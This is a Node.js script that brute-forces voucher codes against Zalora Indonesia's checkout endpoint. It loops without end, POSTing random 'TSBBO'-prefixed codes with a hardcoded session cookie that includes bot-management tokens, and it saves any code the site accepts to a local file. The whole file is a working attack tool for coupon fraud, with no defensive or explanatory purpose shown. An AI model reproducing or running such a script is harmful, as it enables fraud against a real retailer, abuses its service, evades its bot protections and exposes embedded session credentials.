var axios = require("axios");
var FormData = require("form-data");
const rand = require("randomstring");
const fs = require("fs");

(async () => {
  while (true) {
    const vocRand = `TSBBO${rand.generate({
      length: 6,
    })}`.toUpperCase();
    const data = new FormData();
    data.append("couponcode", vocRand);

    const config = {
      method: "post",
      url: "https://www.zalora.co.id/checkout/payment/voucher/",
      headers: {
        Cookie:
          'userLanguage=id;browserDetection=eyJ0eXBlIjoiYnJvd3NlciIsIm5hbWUiOiJDaHJvbWUiLCJjc3NDbGFzcyI6ImNocm9tZSIsInZlcnNpb24iOiI4OSJ9;PHPSESSID_83d0767d2f534a23f21399428e28c076=b6f4cc3b9668fdfc67dcec4f1e78dd68;zid=591529029.1618960841;905125419dc9d3c8f422452a786673ba=-;ak_bmsc=133DD0F11D8E42486572F086EBD56E7117DBB85FC8160000C9617F60EA64FD6E~ple0b4qiq9vDw17nJbP4lyqImcZ+sIgDI3Gn4+BaUApBhRE3UtH/ace78FVh3hTCpWHDsKBPOyhVwwdNv50xmzwyhRPEFvQQ5AHKJe5TpnWGYBLX624ldl/fiXG91qFyeD1Wb7E33zR3Ci50tXjigiuXiBDC4aLugSZZKdWqzgfzeDUFtfrEP2Arm0KkiDuBKltmNB3gDsQypnSXGXOyaUe1+/PBn705dCKn99WF3VPWI=;bm_sz=C2824CC2DECD0E619D7B5D680EB45451~YAAQX7jbF+HKQM94AQAAWvyV8QtwXN7vY4xDlIKsIf0frfQCOfVTJJwUaJmAzmeuDoTooYzA/qNesBleMAUH6VPS8JWDnG4Vq9O6Rgof4uqhSIgSrf8Yi+27fDQwtRE6Ppn55FrpU4D62EDsvuNr8LKitsVEgEv+MZU7natmrFSa5zumzzlTY+5TnjKnEInXsQs=;sessionCount=1;pageCount=1;_abck=1AECE101E9B78F1344746BAEA818C8E9~0~YAAQX7jbF+/KQM94AQAAjAeW8QUUJn4rzWDNiHxqDA3XomRCQwgqNmr3i82YOWCJqiXTnoo8nOgnWD3Rye6A/0C2t5Rc8poarkZX7PH6Dleoyh6bbCT0tHKEaJhIb62H7a0rfiNommfqTu4RJi7SbkdNHmbq9pW1qE1vO6EVEim1cpZe7GBcT/o/9uJ6k4QliZl8uV9u66dF/w787rX3KjRbaxynuzLRJOT3RgeMYuFLxgXCjLUjc7+kvHGkm4rLrwdRR//6Wi3vJ6ypm+YdBdU5vTgt0Zwan/SL2uioA81xJEAgs2KeUXZtPtTcp4K7gco1bqxlOd02Rm9J03CFWHIeL03E+FUcdwxl4EJ82dzlmc5+PsI7LMDCGuTdcdpg3oJ+stM2ASX9ROiFKAu07vCc//1zCvZbzh+1~-1~||-1||~-1;bm_mi=BF909A9EFBCE737A9C167D116BF71160~SIjkt8fdJymT2ffFSgEcKxVwnprKHvn7pklgHR/j2WZ08C3aUajQ94P3gretrbGe4Ygw1I9Z8pHd0/+kEROLy0pN+R2cSPsJXGEnSfvfQ5450zVi3gp29kStchUySvRTHGiV25x8Lsz1fyx5PnRa7Dt7NGzj5OjVQCWBvMitf+LLZeWX0q959XnfGH+8H42P9AAGIo6uvAdxjcL1+nAQrGZ6iz6Zmn78q9C+SHd/jd28ybFzz15HpppZAqCASrtn;current_size_system=International;appc_fd90f1a66e10e44332809072fe7ebd29=071b5187159bf71bea410129cf71af25;is_guest_with_empty_cart=false;rr_rcs=eF5jYSlN9khLTjIwMEhM1DVLNjHXNUlMS9NNMjU01U01Mk01TjYzMTNMMuPKLSvJTBEwtLA00TXUNQQArR0OvA;pageCount=2;bm_sv=7FF4991AD53658D71505A20DA84F3504~/wtRpKFemv1GgIOmlNbpl6w6AQtEC7FeRfrdjnF+esxQRpTqDWjezrfH8FxAPwwQ65HIDXQfoymeMfdarP6q2BJmNwrUlwqXRAhrPnMKiKnrObZ5xgTT6g17t+7QZbyUzR+hxjJoeIlgzMEQqcB2SA2++xMHrGdb5xdadxhLa0A=',        Origin: "https://www.zalora.co.id",
        Referer: "https://www.zalora.co.id/checkout/process/",
        ...data.getHeaders(),
      },
      data: data,
    };

    await axios(config)
      .then(function (response) {
        if (response.data.response === "Kode voucher tidak ditemukan. Mohon cek kembali ") {
          console.log(`[INVALID] => ${vocRand}`);
        } else {
          console.log(`[VALID] => ${vocRand} (${response.data.response})`);
          fs.appendFileSync("vocZalora.txt", `${vocRand}\n`);
        }
      })
      .catch(function (error) {
        console.log(error);
      });
  }
})();
